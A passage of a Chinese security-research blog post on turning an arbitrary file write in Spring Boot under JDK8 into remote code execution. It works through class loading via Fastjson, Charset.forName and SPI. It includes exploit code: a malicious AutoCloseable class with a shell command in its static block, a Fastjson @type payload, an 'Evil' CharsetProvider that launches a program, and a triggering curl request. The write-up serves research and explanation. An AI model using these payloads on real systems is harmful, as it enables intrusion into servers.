Class <span class="title function_">findClass</span><span class="params">(String keyString)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; buckets.length; i++) &#123;</span><br><span class="line">        <span class="type">Entry</span> <span class="variable">bucket</span> <span class="operator">=</span> buckets[i];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (bucket == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Entry&lt;K, V&gt; entry = bucket; entry != <span class="literal">null</span>; entry = entry.next) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">key</span> <span class="operator">=</span> bucket.key;</span><br><span class="line">            <span class="keyword">if</span> (key <span class="keyword">instanceof</span> Class) &#123;</span><br><span class="line">                <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> ((Class) key);</span><br><span class="line">                <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> clazz.getName();</span><br><span class="line">                <span class="keyword">if</span> (className.equals(keyString)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在com.alibaba.fastjson.serializer.MiscCodec#deserialze方法中有以下处理代码，当clazz类型为java.nio.charset.Charset时，调用Charset#forName方法，最终调用到jre&#x2F;lib&#x2F;rt.jar!&#x2F;sun&#x2F;nio&#x2F;cs&#x2F;AbstractCharsetProvider.class中，其中this.packagePrefix值为sun.nio.cs.ext，即charsets.jar的包名前缀，并且参数可控，直接加载可控类即可触发RCE。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz == Charset.class) &#123;</span><br><span class="line">    <span class="keyword">return</span> (T) Charset.forName(strVal);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Charset <span class="title function_">lookup</span><span class="params">(String var1)</span> &#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="type">String</span> <span class="variable">var9</span> <span class="operator">=</span> (String)<span class="built_in">this</span>.classMap.get(var1);</span><br><span class="line">    <span class="keyword">if</span> (var9 == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">var4</span> <span class="operator">=</span> Class.forName(<span class="built_in">this</span>.packagePrefix + <span class="string">&quot;.&quot;</span> + var9, <span class="literal">true</span>, <span class="built_in">this</span>.getClass().getClassLoader());</span><br><span class="line">            <span class="type">Charset</span> <span class="variable">var5</span> <span class="operator">=</span> (Charset)var4.newInstance();</span><br><span class="line">            <span class="built_in">this</span>.cache.put(var1, <span class="keyword">new</span> <span class="title class_">SoftReference</span>(var5));</span><br><span class="line">            <span class="keyword">return</span> var5;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException var6) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException var7) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException var8) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/1743585621559-0f4ccf49-3f8c-491d-93e7-e89959fc776f.png"></p>
+<h4 id="Jackson"><a href="#Jackson" class="headerlink" title="Jackson"></a>Jackson</h4><p><img src="/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/1743585845250-aae272b6-5f58-4dd1-aa4a-99d6ed99afab.png"></p>
+<h4 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h4><p><img src="/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/1743587583962-fc3c0b50-38b8-4636-acd9-b4c70e8827f7.png"></p>
+<h3 id="jre-classes"><a href="#jre-classes" class="headerlink" title="jre&#x2F;classes"></a><font style="color:rgb(36, 41, 47);">jre&#x2F;classes</font></h3><p>除了覆盖JDK8下的Bootstrap和Ext ClassLoader下的jar文件，还可以通过在&#x2F;Library&#x2F;Java&#x2F;JavaVirtualMachines&#x2F;jdkversion&#x2F;Contents&#x2F;Home&#x2F;jre&#x2F;classes目录（不存在就创建一个）下写入恶意class文件，通过Fastjson的expectClass绕过方式触发其加载。</p>
+<p>例如，对于Fastjson 1.2.68可以编写一个实现了java.lang.AutoCloseable的恶意类，在其静态代码块中插入命令执行代码，绕过检查直接触发恶意类的加载，实现RCE。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hacker</span> <span class="keyword">implements</span> <span class="title class_">AutoCloseable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;touch /tmp/hacker.txt&quot;</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;Hacker&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="SPI"><a href="#SPI" class="headerlink" title="SPI"></a>SPI</h3><p>跟进Charset.forName的源码，可以看到存在三个加载Charset的方法，跟进第三种方法，跟进其代码，很明显是一个SPI加载provider的模式。</p>
+<p><img src="/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/1743590578389-c9f7771a-a6aa-46fa-a18b-70dc48af5b6f.png"></p>
+<p><img src="/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/1743590844658-77e03ed4-c5ae-41ce-bd2e-76b1294e2b7b.png"></p>
+<p><img src="/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/1743590888449-f4cee28c-98ab-4dd6-8547-adb34b6f43e5.png"></p>
+<p>可以通过编写一个继承了java.nio.charset.spi.CharsetProvider类的恶意provider，通过SPI机制，触发其加载并初始化。但需要注意的是，由于使用到的是系统类加载器，它对应的是Ext ClassLoader，理论上需要打包成jar包并放到jre&#x2F;lib&#x2F;ext内，并且根据类加载器缓存的机制，需要重启后才能加载到该jar包。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.Charset;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">extends</span> <span class="title class_">java</span>.nio.charset.spi.CharsetProvider &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Iterator&lt;Charset&gt; <span class="title function_">charsets</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;Charset&gt;().iterator();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Charset <span class="title function_">charsetForName</span><span class="params">(String charsetName)</span> &#123;</span><br><span class="line">        <span class="comment">// 因为Charset会被缓存, 导致同样的charsetName只能执行一次</span></span><br><span class="line">        <span class="comment">// 所以可以利用前缀触发, 后面的内容不断变化即可, 甚至可以把命令通过charsetName传入</span></span><br><span class="line">        <span class="keyword">if</span> (charsetName.startsWith(<span class="string">&quot;Evil&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Runtime.getRuntime().exec(<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Charset.forName(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 目录结构</span></span><br><span class="line">.</span><br><span class="line">├── Evil.class</span><br><span class="line">└── META-INF</span><br><span class="line">    └── services</span><br><span class="line">        └── java.nio.charset.spi.CharsetProvider</span><br></pre></td></tr></table></figure>
+
+<p>接着将Evil.class和SPI文件放到jre&#x2F;classes目录后，重新启动SpringBoot项目，构造攻击请求即可。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">&quot;http://127.0.0.1:18081/&quot;</span> -H <span class="string">&quot;Accept: text/html;Charset=Evil&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h2><p>在实际场景中可能需要对服务器上的JDK目录进行爆破；</p>
+<p>在文件上传漏洞中一般无法创建目录，由于classes目录通常需要攻击者自行创建，所以classes和spi的利用方式可能相对于直接覆盖charset.jar的方式来说可执行性较差。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://landgrey.me/blog/22/">Spring Boot FatJar写文件漏洞到稳定RCE的探索</a></p>
+<p><a target="_blank" rel="noopener" href="https://threedr3am.github.io/2021/04/14/JDK8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84SpringBoot%20RCE/">JDK8任意文件写场景下的SpringBoot RCE</a></p>
+
+  </div>
+</article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE"><span class="toc-number">2.</span> <span class="toc-text">前置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FatJar"><span class="toc-number">2.1.</span> <span class="toc-text">FatJar</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B1%BB%E5%8A%A0%E8%BD%BD"><span class="toc-number">2.2.</span> <span class="toc-text">类加载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%9A%84%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B"><span class="toc-number">2.3.</span> <span class="toc-text">类加载器的加载流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%9C%BA%E5%88%B6"><span class="toc-number">2.4.</span> <span class="toc-text">双亲委派机制</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0"><span class="toc-number">4.</span> <span class="toc-text">实现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Charset"><span class="toc-number">4.1.</span> <span class="toc-text">Charset</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Spring"><span class="toc-number">4.1.1.</span> <span class="toc-text">Spring</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Fastjson"><span class="toc-number">4.1.2.</span> <span class="toc-text">Fastjson</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Jackson"><span class="toc-number">4.1.3.</span> <span class="toc-text">Jackson</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JDBC"><span class="toc-number">4.1.4.</span> <span class="toc-text">JDBC</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jre-classes"><span class="toc-number">4.2.</span> <span class="toc-text">jre&#x2F;classes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SPI"><span class="toc-number">4.3.</span> <span class="toc-text">SPI</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A2%8E%E7%A2%8E%E5%BF%B5"><span class="toc-number">5.</span> <span class="toc-text">碎碎念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">6.</span> <span class="toc-text">参考</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://h3rmesk1t.github.io/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://h3rmesk1t.github.io/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/&text=SpringBoot任意文件写场景下的RCE"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://h3rmesk1t.github.io/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/&title=SpringBoot任意文件写场景下的RCE"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://h3rmesk1t.github.io/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/&is_video=false&description=SpringBoot任意文件写场景下的RCE"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SpringBoot任意文件写场景下的RCE&body=Check out this article: https://h3rmesk1t.github.io/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://h3rmesk1t.github.io/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/&title=SpringBoot任意文件写场景下的RCE"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://h3rmesk1t.github.io/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/&title=SpringBoot任意文件写场景下的RCE"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://h3rmesk1t.github.io/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/&title=SpringBoot任意文件写场景下的RCE"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://h3rmesk1t.github.io/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/&title=SpringBoot任意文件写场景下的RCE"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://h3rmesk1t.github.io/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/&name=SpringBoot任意文件写场景下的RCE&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://h3rmesk1t.github.io/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/&t=SpringBoot任意文件写场景下的RCE"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+      <div class="footer-left">
+        Copyright &copy;
+        
+        
+        2023-2025
+        H3rmesk1t
+      </div>
+      <div class="footer-right">
+        <nav>
+          <ul>
+            <!--
+          --><li><a href="/">Home</a></li><!--
+        --><!--
+          --><li><a href="/archives/">Writing</a></li><!--
+        --><!--
+          --><li><a href="/tags/">Tag</a></li><!--
+        --><!--
+          --><li><a href="/search/">Search</a></li><!--
+        --><!--
+          --><li><a href="/about/">About</a></li><!--
+        -->
+          </ul>
+          <ul>
+            
+              <!-- 不蒜子统计 -->
+              <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+              <span class="post-meta-divider">|</span>
+              <span id="busuanzi_container_site_uv" style='display:none'>
+                      本站访客数<span id="busuanzi_value_site_uv"></span>人
+              </span>
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            
+          </ul>
+        </nav>
+      </div>
+      
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'H3rmesk1t/h3rmesk1t.github.io';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = '💬';
+      var utterances_theme = 'github-light';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
